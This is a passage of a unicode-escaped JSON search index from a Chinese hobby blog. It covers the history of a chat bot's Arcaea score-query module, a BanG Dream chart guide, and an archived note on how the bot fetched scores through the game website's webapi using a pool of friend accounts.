\u4e2a\u6708\u7684\u624b\u52a8\u4e0a\u53f7\u6dfb\u52a0\u597d\u53cb\u7684\u91cd\u590d\u52b3\u52a8\u4e2d\u89e3\u8131\u51fa\u6765\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2022-04-01","title":"2022-04-01","text":"<ol> <li>\u7531\u4e8e ArcaeaUnlimitedAPI \u53ef\u4ee5\u6b63\u786e\u8ba1\u7b97 <code>X-Random-Challenge</code> \u5b57\u6bb5\uff0c\u56e0\u6b64\u6062\u590d\u4e86 <code>arc\u83b7\u53d6\u4f53\u529b</code>\u3001<code>arc\u5bfc\u822a</code> \u7684\u5168\u90e8\u529f\u80fd</li> <li>\u6dfb\u52a0\u4e86\u81ea\u52a8\u66f4\u65b0 Arcaea \u7d20\u6750\u6587\u4ef6\u7684 bash \u811a\u672c\uff0c\u8be5\u811a\u672c\u540c\u6837\u53ef\u4ee5\u4e8e GitHub \u4ed3\u5e93 \u83b7\u53d6</li> </ol>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2022-04-08","title":"2022-04-08","text":"<p>\u5f15\u5165 Andreal \u7684\u4e09\u79cd\u6700\u8fd1/\u6700\u4f73\u67e5\u5206\u6837\u5f0f\u53ca\u5176 Best 30 \u67e5\u5206\u6837\u5f0f\uff08\u7531 \u6797\u6587\u8f69 \u4ece Andreal \u79fb\u690d\uff09\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2022-07-28","title":"2022-07-28","text":"<p>\u8bbe\u8ba1\u4e86 ArcaeaChartRender \u5e76\u4ee5\u6b64\u5b9e\u73b0 <code>arc\u8c31\u9762</code> \u529f\u80fd\u3002</p> <p></p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2023-02-19","title":"2023-02-19","text":"<p>\u8bbe\u8ba1\u4e86 auapy\uff0c\u5c06 ArcaeaUnlimitedAPI \u5c01\u88c5\u6210 Python \u5e93\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2023-03-09","title":"2023-03-09","text":"<p>\u5145\u5206\u5229\u7528 AUA \u63d0\u4f9b\u7684 API\uff0c\u5b9e\u73b0\u4e86 arc \u968f\u673a\u6b4c\u66f2\uff08<code>arc\u968f\u673a</code> \u6307\u4ee4\uff09\u3001arc \u6b4c\u66f2\u4fe1\u606f\uff08<code>arc\u6b4c\u66f2</code> \u6307\u4ee4\uff09\u529f\u80fd</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#_2","title":"\u5c3e\u58f0","text":"<p>2023 \u5e74 4 \u6708 28 \u65e5\uff0c\u968f\u7740 AUA \u7684\u7ec8\u6b62\u670d\u52a1\uff0cmokabot Arcaea \u6a21\u5757\u7684\u5f00\u53d1\u4e5f\u5c06\u8fdb\u5165\u5c3e\u58f0\uff0c\u4f46\u662f mokabot \u4ecd\u5c06\u7ee7\u7eed\u66f4\u65b0\uff0c\u53ea\u662f Arcaea \u6a21\u5757\u5c06\u4e0d\u518d\u66f4\u65b0\u3002</p> <p>\u5982\u679c\u6709\u9700\u8981\u5bfc\u51fa\u81ea\u5df1\u6210\u7ee9\u7684\u7528\u6237\uff0c\u53ef\u4ee5\u5728 2023 \u5e74 6 \u6708 1 \u65e5\u524d\u901a\u8fc7\u4ee5\u4e0b URL \u5bfc\u51fa\u81ea\u5df1\u7684\u6210\u7ee9\u4e3a csv \u683c\u5f0f\uff0c\u4e3a\u4ee5\u540e\u53ef\u80fd\u7684 excel \u67e5\u5206\u65b9\u6848\u505a\u51c6\u5907\u3002</p> <pre><code>https://server.awbugl.top/botarcapi/user/best40csv?user=\u60a8\u7684\u7528\u6237\u540d\u6216\u4e5d\u4f4d\u597d\u53cb\u7801\n</code></pre> <p>\u4f8b\u5982 <pre><code>https://server.awbugl.top/botarcapi/user/best40csv?user=895532511\nhttps://server.awbugl.top/botarcapi/user/best40csv?user=ReisenNasu\n</code></pre></p> <p>\u611f\u8c22\u6bcf\u4e00\u4e2a\u4e3a Arcaea \u73a9\u5bb6\u793e\u533a\u4ed8\u51fa\u8fc7\u8d21\u732e\u7684\u4eba\uff0c\u613f\u4f60\u4eec\u4e2a\u4e2a\u6458\u53cc\u661f\uff0c\u66f2\u66f2\u90fd PM\u3002\u56e0\u4f60\u4eec\u7684\u5b58\u5728\uff0c\u7ed9\u8fd9\u4e2a\u539f\u672c\u5c0f\u4f17\u7684\u6e38\u620f\u5e26\u6765\u4e86\u6d3b\u6cfc\u751f\u673a\u3002</p> <p>\u611f\u8c22 Arcaea-Infinity \u7ec4\u7ec7\u4e2d\u7684\u6bcf\u4e00\u540d\u5f00\u53d1\u8005\uff0c\u6211\u4eec\u56e0 Arcaea \u800c\u805a\u5728\u4e00\u8d77\uff0c\u5728\u4e00\u8d77\u5b66\u4e60\u8ba8\u8bba\u7684\u65e5\u5b50\u91cc\u5171\u540c\u6536\u83b7\u4e86\u65e0\u6570\u7684\u4e50\u8da3\uff08\u548c\u8868\u60c5\u5305\uff09\uff0c\u613f\u4f60\u4eec\u7684\u6bcf\u4e2a\u9879\u76ee\u90fd\u80fd star \u7834\u5343\uff0c\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u5199\u5f97\u884c\u4e91\u6d41\u6c34\uff0c\u6bcf\u4e2a\u51fd\u6570\u90fd\u80fd\u4e00\u6c14\u5475\u6210\u3002</p> <p>\u6216\u8bb8\u5728\u82e5\u5e72\u5e74\u540e\uff0c\u8ba2\u9605\u5236\u7684\u5b98\u65b9\u67e5\u5206\u5668\u8d8a\u5f97\u8d8a\u6765\u8d8a\u597d\uff0c\u800c\u67e5\u8be2 b30 \u7684\u6307\u4ee4\u4e5f\u5728\u73a9\u5bb6\u7684\u8fed\u4ee3\u4e4b\u95f4\u6e10\u6e10\u6de1\u5fd8\u3002\u5927\u6982\u4e5f\u4e0d\u4f1a\u6709\u4eba\u518d\u8bb0\u5f97\u4e86\uff0c\u5728\u90a3\u4e4b\u524d\uff0c\u6709\u7740\u65e0\u6570\u4e2a Arcaea bot\uff0c\u4e3a\u6211\u4eec\u63d0\u4f9b\u7740\u514d\u8d39\u800c\u4f18\u8d28\u7684\u67e5\u5206\u670d\u52a1\u3002</p> <p>No one cares? I do.</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230504-chart-analysis-425ex/","title":"\u300aSWITCH ON NOW\u300b AP \u89e3\u6790","text":"<p>\u5927\u5bb6\u597d\uff0c\u8fd9\u91cc\u662f\u79cb\u8449\u4e9c\u91cc\u6c99\uff0c\u8fd9\u4e00\u671f\u5bf9\u5e94\u7684\u300aSWITCH ON NOW\u300bAP \u89e3\u6790\u7531\u6211\u5e26\u6765\u3002</p> <p>\u8fd9\u9996\u6b4c\u53d1\u5e03\u4e8e\u53bb\u5e74\u6691\u5047\u671f\u95f4\uff0c\u5b9a\u7ea7\u4e3a 27\u3002\u4e2a\u4eba\u8ba4\u4e3a\u8fd9\u9996\u6b4c AP \u4e0d\u96be\uff0c\u4f46\u662f\u4ecd\u7136\u6709\u4e00\u4e9b\u5c0f\u7ec6\u8282\u9700\u8981\u6ce8\u610f\uff0c\u5e76\u4e14\u5728 200 BPM \u7684\u5f71\u54cd\u4e0b\uff0c\u4f1a\u5bf9\u73a9\u5bb6\u7684\u4f53\u529b\u6709\u4e00\u5b9a\u7684\u8981\u6c42\u3002</p> <p>\u5148\u4e0a\u8c31\u9762\u6e32\u67d3\u56fe\uff0c\u53ef\u4ee5\u770b\u5230\u8be5\u8c31\u9762\u7684 Slide \u4e0d\u591a\uff0cnote \u591a\u7531 Normal \u548c Flick \u6784\u6210\uff1a</p> <p></p> <p>\u524d\u671f\u7684\u53cc\u62bc\u8f83\u591a\uff0c\u521a\u8fdb\u6b4c\u66f2\u5c31\u5f00\u59cb\u6301\u7eed\u6d88\u8017\u73a9\u5bb6\u7684\u4f53\u529b\u4e86\u3002\u4f46\u7d22\u6027\u8fd9\u624d\u662f\u521a\u5f00\u59cb\uff0c\u5bf9\u73a9\u5bb6\u6765\u8bf4\u95ee\u9898\u4e0d\u5927\uff0c\u57fa\u672c\u4e0a\u4e5f\u5f88\u5c11\u53d1\u751f\u6389 great \u7684\u4e8b\u6545\u3002</p> <p> </p> \u524d\u671f\u53cc\u62bc\u90e8\u5206 <p>\u5728\u7b2c\u4e00\u4e2a\u6280\u80fd\u952e\u5f00\u59cb\u7684\u9644\u8fd1\u6709\u4e00\u5904\u5f88\u660e\u663e\u7684\u697c\u68af\u3002\u79c9\u7740\u5f00\u653e\u6027\u7b54\u6848\u7684\u89e3\u8c31\u601d\u8def\uff0c\u73a9\u5bb6\u65e2\u53ef\u4ee5\u9009\u62e9\u5de6\u624b\u63a5 3 \u4e2a\u518d\u53f3\u624b\u63a5 3 \u4e2a\uff0c\u4e5f\u53ef\u4ee5\u9009\u62e9\u4e00\u53ea\u624b\u76f4\u63a5\u63a5\u5b8c\u3002</p> <p>\u6211\u4e2a\u4eba\u662f\u503e\u5411\u4e8e\u4e00\u53ea\u624b\u76f4\u63a5\u63a5\u5b8c\u7684\uff0c\u4e0d\u8fc7\u8fd9\u6837\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\u3002\u4e00\u822c\u6765\u8bf4\u8fd9\u79cd\u5411\u53f3\u53d1\u5c55\u7684\u697c\u68af\u7528\u53f3\u624b\u63a5\u518d\u5408\u9002\u4e0d\u8fc7\u4e86\uff0c\u4f46\u662f\u5728\u8fd9\u4e4b\u524d\u6709\u4e00\u4e2a\u5e26\u7c89\u952e\u7684\u53cc\u62bc\uff08101 \u548c 102\uff09\uff0c\u5de6\u624b\u5904\u7406\u7c89\u952e\u5bfc\u81f4\u7684\u4f4d\u79fb\uff0c\u4f1a\u8ba9\u5de6\u624b\u81ea\u7136\u800c\u7136\u5730\u63a5\u4e0a\u540e\u9762\u7684\u697c\u68af\u3002</p> <p>\u63a5\u8fd1\u7ed3\u5c3e\u65f6\uff0c\u4e5f\u6709\u4e00\u4e2a\u7c7b\u4f3c\u7684\u697c\u68af\uff0c\u867d\u7136\u53cc\u62bc\u957f\u5f97\u4e0d\u4e00\u6837\uff0c\u4f46\u662f\u6548\u679c\u662f\u4e00\u6837\u7684\uff1a\u53f3\u624b\u5904\u7406\u7c89\u952e\u5bfc\u81f4\u7684\u4f4d\u79fb\u8ba9\u53f3\u624b\u504f\u79bb\u592a\u8fdc\uff0c\u56e0\u6b64\u4ecd\u7136\u4f1a\u4f7f\u5de6\u624b\u81ea\u7136\u5730\u63a5\u4e0a\u697c\u68af\u3002</p> <p> </p> \u524d\u9762\u7684\u697c\u68af <p> </p> \u540e\u9762\u7684\u697c\u68af <p>\u5728\u8be5\u697c\u68af\u7ed3\u675f\u4e4b\u540e\uff0c\u8c31\u9762\u4e2d\u4fbf\u5f00\u59cb\u4e0d\u65ad\u51fa\u73b0 16 \u5206\uff0c\u6b64\u65f6\u5bf9\u73a9\u5bb6\u4f53\u529b\u548c\u5e95\u529b\u8003\u9a8c\u8f83\u5927\u3002</p> <p>\u5728 combo 231 \u4e4b\u540e\u4f1a\u63a5\u4e24\u4e2a\u8f83\u5927\u4f4d\u79fb\u7684\u7eff\u6761\uff0c\u5728\u8fd9\u79cd\u4f4d\u79fb\u8f83\u5927\u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u66f4\u5bb9\u6613\u5728\u5c3e\u5224\u4e0a\u51fa\u73b0\u95ee\u9898\uff0c\u6240\u4ee5\u9700\u8981\u591a\u52a0\u6ce8\u610f\u3002</p> <p>\u5728 combo 381 \u9644\u8fd1\uff0c\u5728\u7eff\u6761\u7ed3\u675f\u4e4b\u540e\u6709\u4e00\u4e2a 16 \u5206\u51fa\u73b0\uff0c\u6211\u5148\u524d\u5728\u8fd9\u91cc\u624b\u7656\u8fc7\uff0c\u5bfc\u81f4 382 \u8fd9\u4e2a note \u603b\u662f\u6f0f\u6389\u6216\u8005\u6253\u6210 great\u3002\u751a\u81f3\u6709\u51e0\u6b21\u56e0\u4e3a\u6f0f\u8fc7\u4e86 382 \u800c\u76f4\u63a5\u5224\u5b9a\u5230\u540e\u9762\u90a3\u4e2a\u53cc\u62bc\u4e0a\u3002</p> <p> </p> combo 381 \u9644\u8fd1\u7684\u914d\u7f6e <p>\u5982\u679c\u4f60\u548c\u6211\u4e00\u6837\u5728\u8fd9\u91cc\u624b\u7656\uff0c\u90a3\u4e48\u8bf7\u5c24\u5176\u6ce8\u610f 382 \u8fd9\u4e2a note \u5373\u53ef\uff0c\u5982\u679c\u4f60\u5728\u8fd9\u91cc\u6ca1\u6709\u624b\u7656\u8bf7\u76f4\u63a5\u65e0\u89c6\u3002</p> <p>\u4ece combo 560 \u5f00\u59cb\u4f1a\u6709\u4e00\u6bb5\u52b2\u7206\u7684 8 \u5206 15 \u8fde\u53cc\u62bc\uff0c\u8bf7\u52a1\u5fc5\u63a7\u5236\u597d\u8282\u594f\uff0c\u4e0d\u8981\u6253\u5feb\u6216\u8005\u6253\u6162\u3002</p> <p>\u603b\u7684\u6765\u8bf4\uff0c\u8fd9\u9996\u6b4c\u7684 AP \u4e0d\u96be\uff0c\u5728 \u6240\u6709\u7684 27 \u6b4c\u66f2\u4e2d\u5904\u4e8e\u4e2d\u7b49\u96be\u5ea6\u6c34\u5e73\u3002\u96be\u70b9\u4e4b\u5904\u5728\u4e8e\u8fd9\u9996\u6b4c\u7684 BPM \u6570\u503c\u8f83\u9ad8\uff08200\uff09\uff0c\u5e76\u4e14 Slide \u6570\u91cf\u8f83\u5c11\uff0c\u8fd9\u610f\u5473\u7740\u73a9\u5bb6\u9700\u8981\u5728\u9ad8 BPM \u4e0b\u6301\u7eed\u4ea4\u4e92\uff0c\u56e0\u6b64\u5bf9\u73a9\u5bb6\u7684\u4f53\u529b\u6709\u4e00\u5b9a\u7684\u8003\u9a8c\u3002</p>","tags":["bandori"]},{"location":"blog/2023/230512-arcaea-webapi-archive/","title":"\uff08\u5b58\u6863\uff09\u4ec0\u4e48\u662f webapi \u67e5\u5206\u65b9\u6848","text":"<p>Info</p> <p>\u4f5c\u4e3a mokabot \u65e7\u6587\u6863\u7684\u5907\u4efd\u4e4b\u4e00\uff0c\u8fd9\u91cc\u7b80\u5355\u63cf\u8ff0\u4e86 2021 \u5e74 6 \u6708\u81f3 2022 \u5e74 3 \u6708\u671f\u95f4\u4f7f\u7528\u7684 Arcaea webapi \u67e5\u5206\u65b9\u6848\u3002</p> <p>\u56e0 mokabot \u91cd\u6784\uff0c\u5220\u9664\u4e86\u4e00\u4e9b\u8fc7\u65f6\u7684\u65e7\u6587\u6863\uff0c\u5176\u4e2d\u4e5f\u5305\u62ec\u6b64\u7bc7\u6587\u6863\u3002</p> <p>\u672c\u6765\u8fd9\u7bc7\u6587\u6863\u4e5f\u662f\u88ab\u5220\u9664\u7684\u5bf9\u8c61\u4e4b\u4e00\uff0c\u4f46\u9274\u4e8e webapi \u67e5\u5206\u65b9\u6848\u4f5c\u4e3a 2021 \u5e74 6 \u6708\u81f3 2022 \u5e74 3 \u6708\u671f\u95f4\uff08\u6211\uff09\u67e5\u5206\u7684\u6700\u540e\u624b\u6bb5\uff0c\u662f\u5177\u6709\u4e00\u5b9a\u5386\u53f2\u610f\u4e49\u7684\uff0c\u56e0\u6b64\u7279\u5730\u5c06\u6587\u6863\u5b58\u6863\u81f3\u535a\u5ba2\u3002</p> <p>\u8fd9\u7bc7\u6587\u6863\u7684\u539f\u59cb\u5730\u5740\u662f https://github.com/MokaDevelopers/mokabot2/blob/master/docs/advanced/whats_webapi.md</p> <p>\u4ee5\u4e0b\u6b63\u6587\u5f00\u59cb\uff1a</p> <p>Warning</p> <p>\u6ce8\u610f \u8fd9\u4e0d\u662f\u4e00\u4e2a\u957f\u4e45\u4e4b\u8ba1</p>","tags":["arcaea","archive"]},{"location":"blog/2023/230512-arcaea-webapi-archive/#_1","title":"\u539f\u7406\uff08\u9762\u5411\u5f00\u53d1\u8005\uff09","text":"<p>webapi \u67e5\u5206\u65b9\u6848\u5229\u7528\u4e86 Arcaea \u5b98\u7f51\u7684\u767b\u5f55\u673a\u5236\u3002</p> <p>\u5f53\u4f60\u5728\u5b98\u7f51\u8fdb\u884c \u767b\u5f55 \u4e4b\u524d\uff0c\u8bf7\u6253\u5f00\u6d4f\u89c8\u5668\u7684\u5f00\u53d1\u8005\u6a21\u5f0f\uff08\u4e00\u822c\u662f\u6309\u4e0b F12\uff09\u5e76\u5207\u6362\u5230\u7f51\u7edc\u9009\u9879\u5361\uff0c\u5728\u767b\u5f55\u5b8c\u6210\u540e\u5728\u7f51\u7edc\u8bf7\u6c42\u4e2d\u7b5b\u9009\u51fa\u5305\u542b <code>webapi</code> \u7684 url\u3002</p> <p>\u627e\u5230\u4e00\u4e2a <code>https://webapi.lowiro.com/webapi/user/me</code> \u7684 url\uff0c\u89c2\u5bdf\u5176\u54cd\u5e94 json\u3002</p> <p>\ud83d\udc4d\ud83d\udc4d\ud83d\udc4d</p> <p>\u5982\u679c\u4f60\u662f\u4e00\u4e2a\u5bf9 Arcaea \u7684 API \u975e\u5e38\u719f\u6089\u7684\u4eba\uff0c\u770b\u5230\u8fd9\u4e2a json \u7684\u5185\u5bb9\uff0c\u6b64\u65f6\u4f60\u5df2\u7ecf\u731c\u5230\u6211\u4e0b\u4e00\u6b65\u8981\u600e\u4e48\u505a\u4e86\u3002\u4f46\u662f\u8fd9\u4e2a\u65b9\u6848\u6700\u5927\u7684\u7f3a\u70b9\u5c31\u662f\uff0cwebapi \u4ec5\u80fd\u5b9e\u73b0 <code>\u767b\u5f55</code> \u8fd9\u4e00\u4e2a\u64cd\u4f5c\uff0c\u5176\u4ed6\u81ea\u52a8\u5316\u64cd\u4f5c\uff08\u4f8b\u5982\uff0c<code>\u6dfb\u52a0\u597d\u53cb</code>\u3001<code>\u5220\u9664\u597d\u53cb</code> \u548c <code>\u597d\u53cb\u6b4c\u66f2\u6210\u7ee9</code>\u7b49 API\uff09\u5747\u65e0\u6cd5\u5b9e\u73b0\uff0c\u56e0\u6b64\u6682\u65f6\u53ea\u80fd\u4eba\u5de5\u4e0a\u53f7\u6dfb\u52a0\u597d\u53cb\u5e76\u4e14\u4e0d\u5220\u9664\u5b83\u3002</p> <p>\u53d7\u9650\u5236\u4e8e\u6bcf\u4e2a\u8d26\u53f7\u9ed8\u8ba4\u53ea\u6709 10 \u4e2a\u597d\u53cb\u4f4d\uff0c\u56e0\u6b64\u9700\u8981\u5927\u91cf\u8d26\u53f7\u6765\u7ec4\u6210\u4e00\u4e2a\u8d26\u53f7\u96c6\u7fa4\u3002</p>","tags":["arcaea","archive"]},{"location":"blog/2023/230512-arcaea-webapi-archive/#_2","title":"\u539f\u7406\uff08\u9762\u5411\u7528\u6237\uff09","text":"<p>\u6211\u5c06\u4ee5\u4e00\u4e2a\u7528\u6237\u80fd\u770b\u61c2\u7684\u65b9\u5f0f\u6765\u63cf\u8ff0\u8fd9\u4e00\uff08\u534a\uff09\u81ea\u52a8\u5316\u884c\u4e3a\u3002</p>","tags":["arcaea","archive"]},{"location":"blog/2023/230512-arcaea-webapi-archive/#step1-mokabot","title":"STEP1: \u7528\u6237\u5411mokabot\u63d0\u4ea4\u7ed1\u5b9a\u4fe1\u606f","text":"<pre><code>arc\u7ed1\u5b9a 114514191\narc\u7ed1\u5b9a\u7528\u6237\u540d FuLowiriCk\n</code></pre> <p>\u6b64\u65f6\u597d\u53cb\u7801\u548c\u7528\u6237\u540d\u90fd\u7ed1\u5b9a\u5b8c\u6bd5\u3002</p>","tags":["arcaea","archive"]},{"location":"blog/2023/230512-arcaea-webapi-archive/#step2-mokabot","title":"STEP2: mokabot\u63d0\u9192\u6211\u6dfb\u52a0\u597d\u53cb","text":"<pre><code>\u6536\u5230\u65b0\u7684arc\u7528\u6237\u540d\u7ed1\u5b9a\uff08\u7528\u6237\u540d:FuLowiriCk\uff0c\u597d\u53cb\u7801:114514191\uff0cQQ:12345678\uff09\uff0c\u8bf7\u8bb0\u5f97\u52a0\u597d\u53cb\n</code></pre>","tags":["arcaea","archive"]},{"location":"blog/2023/230512-arcaea-webapi-archive/#step3-parisa","title":"STEP3: \u6211\u5c06\u4f60\u6dfb\u52a0\u5230 <code>PArisa</code> \u7684\u597d\u53cb\u5217\u8868\u4e2d","text":"<p>\u6253\u5f00\u624b\u673a\u4e0a\u7684 Arcaea \u5ba2\u6237\u7aef\uff0c\u767b\u5f55\u5230 PArisa\uff0c\u8f93\u5165\u4f60\u7684\u597d\u53cb\u7801 <code>114514191</code>\uff0c\u7136\u540e\u4f60\u6210\u4e3a\u4e86 PArisa \u7684 Arcaea \u597d\u53cb\u3002</p>","tags":["arcaea","archive"]},{"location":"blog/2023/230512-arcaea-webapi-archive/#step4-arc","title":"STEP4: \u4f60\u6b64\u65f6\u53ef\u4ee5\u4f7f\u7528<code>arc\u6700\u8fd1</code>\u6307\u4ee4","text":"<pre><code>arc\u6700\u8fd1\n</code></pre>","tags":["arcaea","archive"]},{"location":"blog/2023/230512-arcaea-webapi-archive/#step5-mokabot","title":"STEP5: mokabot \u8bd5\u56fe\u83b7\u53d6\u4f60\u7684\u6210\u7ee9","text":"<p>mokabot \u767b\u5f55\u5230 PArisa \u7684\u8d26\u53f7\uff0c\u4ece\u6240\u6709\u597d\u53cb\u7684\u6210\u7ee9\u4e2d\u4e00\u4e00\u7b5b\u9009\uff0c\u76f4\u5230\u627e\u5230\u4f60\u7684\u597d\u53cb\u540d\uff08\u8fd9\u4e5f\u662f\u4f7f\u7528 webapi \u67e5\u5206\u65b9\u6848\u9700\u8981\u7ed1\u5b9a\u597d\u53cb\u540d\u7684\u6839\u672c\u539f\u56e0\uff09\u3002</p>","tags":["arcaea","archive"]},{"location":"blog/2023/230512-arcaea-webapi-archive/#step6-mokabot","title":"STEP6: mokabot \u627e\u5230\u4e86\u4f60\u7684\u6210\u7ee9\uff0c\u5206\u6790\u5e76\u53d1\u9001","text":"","tags":["arcaea","archive"]},{"location":"blog/2023/230512-arcaea-webapi-archive/#parisa","title":"PArisa","text":"<p><code>PArisa</code> \u662f\u4e00\u4e2a\u4f7f\u7528 webapi \u67e5\u5206\u65b9\u6848\u7684\u8d26\u53f7\u96c6\u7fa4\uff0c\u76ee\u524d\u7ea6\u6709 50 \u4e2a\u8d26\u53f7\uff0c\u53ef\u4ee5\u63d0\u4f9b\u5927\u7ea6 500 \u4e2a Arcaea \u597d\u53cb\u4f4d\u5bb9\u91cf\u3002</p> <p>\u5f53\u672c\u6587\u6863\u4e2d\u63d0\u5230 <code>PArisa</code> \u65f6\uff0c\u4f60\u603b\u662f\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u4e00\u4e2a\u5177\u6709 500 \u4e2a\u597d\u53cb\u4f4d\u7684\u5de8\u578b\u7f1d\u5408\u8d26\u53f7\u3002</p>","tags":["arcaea","archive"]}]}